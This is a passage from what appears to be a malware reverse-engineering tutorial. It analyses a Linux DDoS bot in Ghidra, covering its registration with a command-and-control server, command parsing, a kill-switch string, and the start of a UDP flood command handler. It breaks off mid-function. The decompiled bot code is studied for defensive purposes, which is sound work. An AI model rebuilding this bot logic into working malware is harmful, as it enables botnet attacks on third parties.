<p>At last, the length of the string is calculated in a loop, after which the data is sent to the command &#038; control server using the main socket. Below, the refactored code is given.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">bot_architecture <span class="sy0">=</span> getBuild<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">sprintf</span><span class="br0">&#40;</span>messageBuffer<span class="sy0">,</span>                    
        <span class="st0">&quot;<span class="es2">\x1b</span>[0m<span class="es2">\x1b</span>[0;31m[<span class="es2">\x1b</span>[0;36m%s<span class="es2">\x1b</span>[0;31m]<span class="es2">\x1b</span>[0m Device Joined [Host:%s] [Arch:%s][Name:%s]<span class="es2">\x1b</span>[0m<span class="es1">\r</span><span class="es1">\n</span>&quot;</span>
          <span class="sy0">,</span>enc_name<span class="sy0">,</span><span class="nu12">0x510068</span><span class="sy0">,</span>bot_architecture<span class="sy0">,</span><span class="nu12">0x510004</span><span class="br0">&#41;</span><span class="sy0">;</span>
messageLength <span class="sy0">=</span> <span class="nu12">0xffffffffffffffff</span><span class="sy0">;</span>
messageCopy <span class="sy0">=</span> messageBuffer<span class="sy0">;</span>
<span class="kw1">do</span> <span class="br0">&#123;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>messageLength <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
  messageLength <span class="sy0">=</span> messageLength <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
  currentMessageChar <span class="sy0">=</span> <span class="sy0">*</span>messageCopy<span class="sy0">;</span>
  messageCopy <span class="sy0">=</span> messageCopy <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
<span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>currentMessageChar <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
write<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span>messageBuffer<span class="sy0">,</span>~messageLength <span class="sy0">-</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p><a name ="parsing-a-command"></a></p>
<h2><a href="#parsing-a-command">Parsing a command</a></h2>
<p>After the bot has been registered, it will await a command from the command &#038; control server. The code below parses the incoming commands.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">void</span> recv_buf<span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  <span class="kw4">long</span> lVar3<span class="sy0">;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>pcVar4<span class="sy0">;</span>
  ssize_t sVar5<span class="sy0">;</span>
  ulong uVar6<span class="sy0">;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>pcVar1<span class="sy0">;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>local_488 <span class="br0">&#91;</span><span class="nu0">12</span><span class="br0">&#93;</span><span class="sy0">;</span>
  <span class="kw4">char</span> local_428 <span class="br0">&#91;</span><span class="nu0">1024</span><span class="br0">&#93;</span><span class="sy0">;</span>
  <span class="kw4">int</span> local_28<span class="sy0">;</span>
  uint local_24<span class="sy0">;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>local_20<span class="sy0">;</span>
  <span class="kw4">char</span> cVar1<span class="sy0">;</span>
  uint uVar2<span class="sy0">;</span>
&nbsp;
  <span class="kw1">do</span> <span class="br0">&#123;</span>
    sVar5 <span class="sy0">=</span> read<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span>local_428<span class="sy0">,</span><span class="nu12">0x400</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>sVar5 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      <span class="kw1">return</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    local_24 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
    <span class="kw3">memset</span><span class="br0">&#40;</span>local_488<span class="sy0">,</span><span class="nu0">0</span><span class="sy0">,</span><span class="nu12">0x58</span><span class="br0">&#41;</span><span class="sy0">;</span>
    local_20 <span class="sy0">=</span> <span class="kw3">strtok</span><span class="br0">&#40;</span>local_428<span class="sy0">,</span><span class="st0">&quot; &quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">while</span> <span class="br0">&#40;</span><span class="br0">&#40;</span>local_20 <span class="sy0">!=</span> <span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span> <span class="sy0">&amp;&amp;</span> <span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_24 <span class="sy0">&lt;</span> <span class="nu0">10</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      uVar6 <span class="sy0">=</span> <span class="nu12">0xffffffffffffffff</span><span class="sy0">;</span>
      pcVar1 <span class="sy0">=</span> local_20<span class="sy0">;</span>
      <span class="kw1">do</span> <span class="br0">&#123;</span>
        <span class="kw1">if</span> <span class="br0">&#40;</span>uVar6 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
        uVar6 <span class="sy0">=</span> uVar6 <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
        cVar1 <span class="sy0">=</span> <span class="sy0">*</span>pcVar1<span class="sy0">;</span>
        pcVar1 <span class="sy0">=</span> pcVar1 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
      <span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>cVar1 <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
      pcVar1 <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="kw3">malloc</span><span class="br0">&#40;</span>~uVar6<span class="br0">&#41;</span><span class="sy0">;</span>
      local_488<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_24<span class="br0">&#93;</span> <span class="sy0">=</span> pcVar1<span class="sy0">;</span>
      lVar3 <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_24<span class="sy0">;</span>
      <span class="kw3">strcpy</span><span class="br0">&#40;</span>local_488<span class="br0">&#91;</span>lVar3<span class="br0">&#93;</span><span class="sy0">,</span>local_20<span class="br0">&#41;</span><span class="sy0">;</span>
      local_20 <span class="sy0">=</span> <span class="kw3">strtok</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="sy0">,</span><span class="st0">&quot; &quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
      local_24 <span class="sy0">=</span> local_24 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    pcVar4 <span class="sy0">=</span> <span class="kw3">strstr</span><span class="br0">&#40;</span>local_428<span class="sy0">,</span>enc_proc_kill<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>pcVar4 <span class="sy0">!=</span> <span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      <span class="kw3">exit</span><span class="br0">&#40;</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span><span class="nu0">0</span> <span class="sy0">&lt;</span> <span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_24<span class="br0">&#41;</span> <span class="br0">&#123;</span>
      cmd_parse<span class="br0">&#40;</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>local_24<span class="sy0">,</span>local_488<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    local_28 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
    <span class="kw1">while</span> <span class="br0">&#40;</span>local_28 <span class="sy0">&lt;</span> <span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_24<span class="br0">&#41;</span> <span class="br0">&#123;</span>
      <span class="kw3">free</span><span class="br0">&#40;</span>local_488<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_28<span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
      local_28 <span class="sy0">=</span> local_28 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
  <span class="br0">&#125;</span> <span class="kw1">while</span><span class="br0">&#40;</span> <span class="kw2">true</span> <span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>At first the size of the incoming message is read from the main socket and stored in <em>sVar5</em>. The actual data itself is stored in <em>local_428</em>. The variable named <em>sVar5</em> can be renamed into <em>commandLength</em>. The variable named <em>local_428</em> can be renamed into <em>command</em>.</p>
<p>If the size is equal to <em>0</em>, meaning no message has been sent to the bot, the function will return.</p>
<p>When the size of the command is not equal to zero, the variable <em>local_24</em> is set to <em>0</em> and a buffer of 88 bytes (<em>0x58</em> in hexadecimal) is alloacted, which is named <em>local_48</em>. When looking in the variable declaration at the top of the function, one will see that <em>local_488</em> appears to be a character array of 12 in size, whilst 88 bytes are allocated in size. </p>
<p>To change the size in Ghidra&#8217;s decompiler, one has to retype the variable, as the size is included in the type. One can change the size by changing <em> char *[12]</em> into <em>char *[88]</em>. After changing the size, commit the local variables again.</p>
<p>Since the function&#8217;s content has been changed, some variables are automatically renamed by Ghidra. The variable that was previously named <em>command</em> has been renamed to <em>local_488</em> and is now used as an argument in the <a href="https://linux.die.net/man/3/read">read</a>  and <a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memset-wmemset?view=vs-2019">memset</a> functions. It can be renamed into <em>command</em> again.</p>
<p>The first part of the function is given below in refactored form.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw1">do</span> <span class="br0">&#123;</span>
  commandLength <span class="sy0">=</span> read<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span>command <span class="sy0">+</span> <span class="nu12">0xc</span><span class="sy0">,</span><span class="nu12">0x400</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>commandLength <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">return</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
  local_24 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  <span class="kw3">memset</span><span class="br0">&#40;</span>command<span class="sy0">,</span><span class="nu0">0</span><span class="sy0">,</span><span class="nu12">0x58</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="co1">//[...]</span></pre></div></div></div></div></div></div></div>


<p>Below that, the <a href="https://www.tutorialspoint.com/c_standard_library/c_function_strtok.htm">strok</a> function is used to split the command (at offset <em>0xc</em>) into different parts, based on the used delimiter, which is a space.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">local_20 <span class="sy0">=</span> <span class="kw3">strtok</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>command <span class="sy0">+</span> <span class="nu12">0xc</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="st0">&quot; &quot;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>As such, the <em>local_20</em> variable can be renamed to <em>splittedCommand</em>.</p>
<p>The while-loop below contains a string length calculation loop that was observed multiple times before.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw1">while</span> <span class="br0">&#40;</span><span class="br0">&#40;</span>splittedCommand <span class="sy0">!=</span> <span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span> <span class="sy0">&amp;&amp;</span> <span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_24 <span class="sy0">&lt;</span> <span class="nu0">10</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  uVar6 <span class="sy0">=</span> <span class="nu12">0xffffffffffffffff</span><span class="sy0">;</span>
  pcVar1 <span class="sy0">=</span> splittedCommand<span class="sy0">;</span>
  <span class="kw1">do</span> <span class="br0">&#123;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>uVar6 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
    uVar6 <span class="sy0">=</span> uVar6 <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
    cVar1 <span class="sy0">=</span> <span class="sy0">*</span>pcVar1<span class="sy0">;</span>
    pcVar1 <span class="sy0">=</span> pcVar1 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
  <span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>cVar1 <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
  pcVar2 <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="kw3">malloc</span><span class="br0">&#40;</span>~uVar6<span class="br0">&#41;</span><span class="sy0">;</span>
  command<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_24<span class="br0">&#93;</span> <span class="sy0">=</span> pcVar2<span class="sy0">;</span>
  lVar3 <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_24<span class="sy0">;</span>
  <span class="kw3">strcpy</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span>lVar3<span class="br0">&#93;</span><span class="sy0">,</span>splittedCommand<span class="br0">&#41;</span><span class="sy0">;</span>
  splittedCommand <span class="sy0">=</span> <span class="kw3">strtok</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="sy0">,</span><span class="st0">&quot; &quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  local_24 <span class="sy0">=</span> local_24 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The variable <em>uVar6</em> is equal to <em>-1</em>, but the decompiler displays the unsigned value as a signed one. Keep this in mind during the analysis.</p>
<p>At the bottom of the loop, one can see that the <em>local_24</em> variable is incremented with one just before the next iteration starts. Within the while-condition, a comparison is made to see if the the value of <em>local_24</em> is less than 10. Since the <em>local_24</em> variable is set to <em>0</em> before, this means that the loop iterates 10 times. The <em>local_24</em> variable can be renamed to <em>i</em>.</p>
<p>When renaming the string length loop, the code becomes much more readable, as can be seen below. Additionally, the <em>lVar3</em> variable can be renamed into <em>i_also</em>, as it is made equal to <em>i</em> (<em>local_24</em> in the code above).</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw1">while</span> <span class="br0">&#40;</span><span class="br0">&#40;</span>splittedCommand <span class="sy0">!=</span> <span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span> <span class="sy0">&amp;&amp;</span> <span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>i <span class="sy0">&lt;</span> <span class="nu0">10</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  splittedCommandLength <span class="sy0">=</span> <span class="nu12">0xffffffffffffffff</span><span class="sy0">;</span>
  splittedCommandCopy <span class="sy0">=</span> splittedCommand<span class="sy0">;</span>
  <span class="kw1">do</span> <span class="br0">&#123;</span>
	<span class="kw1">if</span> <span class="br0">&#40;</span>splittedCommandLength <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
	splittedCommandLength <span class="sy0">=</span> splittedCommandLength <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
	currentChar <span class="sy0">=</span> <span class="sy0">*</span>splittedCommandCopy<span class="sy0">;</span>
	splittedCommandCopy <span class="sy0">=</span> splittedCommandCopy <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
  <span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>currentChar <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
  pcVar1 <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="kw3">malloc</span><span class="br0">&#40;</span>~splittedCommandLength<span class="br0">&#41;</span><span class="sy0">;</span>
  command<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>i<span class="br0">&#93;</span> <span class="sy0">=</span> pcVar1<span class="sy0">;</span>
  i_also <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>i<span class="sy0">;</span>
  <span class="kw3">strcpy</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span>i_also<span class="br0">&#93;</span><span class="sy0">,</span>splittedCommand<span class="br0">&#41;</span><span class="sy0">;</span>
  splittedCommand <span class="sy0">=</span> <span class="kw3">strtok</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="sy0">,</span><span class="st0">&quot; &quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  i <span class="sy0">=</span> i <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The variable <em>pcVar1</em> is equal to a buffer that has the size of the command. After some juggling with variables, the splitted command is copied into the <em>command</em> variable. The variable <em>pcVar1</em> can be renamed into <em>command_copy</em>.</p>
<p>The last part of the function within the endless loop is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">pcVar4 <span class="sy0">=</span> <span class="kw3">strstr</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>command <span class="sy0">+</span> <span class="nu12">0xc</span><span class="br0">&#41;</span><span class="sy0">,</span>enc_proc_kill<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">if</span> <span class="br0">&#40;</span>pcVar4 <span class="sy0">!=</span> <span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw3">exit</span><span class="br0">&#40;</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="nu0">0</span> <span class="sy0">&lt;</span> <span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>i<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  cmd_parse<span class="br0">&#40;</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>i<span class="sy0">,</span>command<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
local_28 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="kw1">while</span> <span class="br0">&#40;</span>local_28 <span class="sy0">&lt;</span> <span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>i<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw3">free</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_28<span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  local_28 <span class="sy0">=</span> local_28 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The <a href="https://www.tutorialspoint.com/c_standard_library/c_function_strstr.htm">strstr</a> function is used to find a string within a given buffer. The buffer is the first argument, whereas the second argument is the string to find. In this case, the buffer is searched for value of <em>enc_proc_kill</em>, which equals <em>hahawekillyou</em>. If this string does occur (the code states that the condition should not not happen), the bot shuts itself down. If the value is not present and the amount of loops above is more than <em>0</em>, the <em>cmd_parse</em> function is called with <em>i</em> and <em>command</em> as arguments.</p>
<p>If this condition is not met, or when the <em>cmd_parse</em> function returns, a while-loop that <a href="https://www.tutorialspoint.com/c_standard_library/c_function_free.htm">frees</a> data is encountered. The code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">local_28 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="kw1">while</span> <span class="br0">&#40;</span>local_28 <span class="sy0">&lt;</span> <span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>i<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw3">free</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_28<span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  local_28 <span class="sy0">=</span> local_28 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The variable <em>local_28</em> can be renamed into <em>count</em> to increase the readability of the code.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">count <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="kw1">while</span> <span class="br0">&#40;</span>count <span class="sy0">&lt;</span> <span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>i<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw3">free</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>count<span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  count <span class="sy0">=</span> count <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The value of <em>command</em> at the index of <em>count</em> is freed. This is done to ensure that the next iteration of the endless loop does not contain parts of a previously issued command.</p>
<p><a name ="analysing-the-command-handling"></a></p>
<h2><a href="#analysing-the-command-handling">Analysing the command handling</a></h2>
<p>Upon receiving a command from the command &#038; control server, it is processed within the bot. The command value is then processed internally, after which the corresponding functions are executed.</p>
<p>At first glance, one can instantly rename the function&#8217;s two arguments. The first one is equal to <em>i</em> and the second one is equal to <em>command</em>. The code after these steps is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">void</span> cmd_parse<span class="br0">&#40;</span><span class="kw4">int</span> i<span class="sy0">,</span><span class="kw4">char</span> <span class="sy0">**</span>command<span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>pcVar3<span class="sy0">;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>pcVar4<span class="sy0">;</span>
  <span class="kw4">int</span> iVar3<span class="sy0">;</span>
  uint uVar4<span class="sy0">;</span>
  uint uVar5<span class="sy0">;</span>
  uint uVar6<span class="sy0">;</span>
  uint uVar7<span class="sy0">;</span>
  __pid_t _Var8<span class="sy0">;</span>
  <span class="kw4">int</span> iVar5<span class="sy0">;</span>
  uint uVar8<span class="sy0">;</span>
  uint uVar9<span class="sy0">;</span>
  __pid_t _Var10<span class="sy0">;</span>
  uint local_b4<span class="sy0">;</span>
  <span class="kw4">int</span> local_b0<span class="sy0">;</span>
  <span class="kw4">int</span> local_ac<span class="sy0">;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>pcVar1<span class="sy0">;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>pcVar2<span class="sy0">;</span>
&nbsp;
  iVar3 <span class="sy0">=</span> <span class="kw3">strcmp</span><span class="br0">&#40;</span><span class="sy0">*</span>command<span class="sy0">,</span>enc_udp<span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>iVar3 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span><span class="nu0">6</span> <span class="sy0">&lt;</span> i<span class="br0">&#41;</span> <span class="br0">&#123;</span>
      pcVar1 <span class="sy0">=</span> command<span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span><span class="sy0">;</span>
      uVar4 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">2</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
      uVar5 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">3</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
      uVar6 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">4</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
      uVar7 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">5</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span>i <span class="sy0">&lt;</span> <span class="nu0">7</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        local_b4 <span class="sy0">=</span> <span class="nu0">1000</span><span class="sy0">;</span>
      <span class="br0">&#125;</span>
      <span class="kw1">else</span> <span class="br0">&#123;</span>
        local_b4 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">6</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="br0">&#125;</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span>i <span class="sy0">&lt;</span> <span class="nu0">8</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        local_b0 <span class="sy0">=</span> <span class="nu0">1000000</span><span class="sy0">;</span>
      <span class="br0">&#125;</span>
      <span class="kw1">else</span> <span class="br0">&#123;</span>
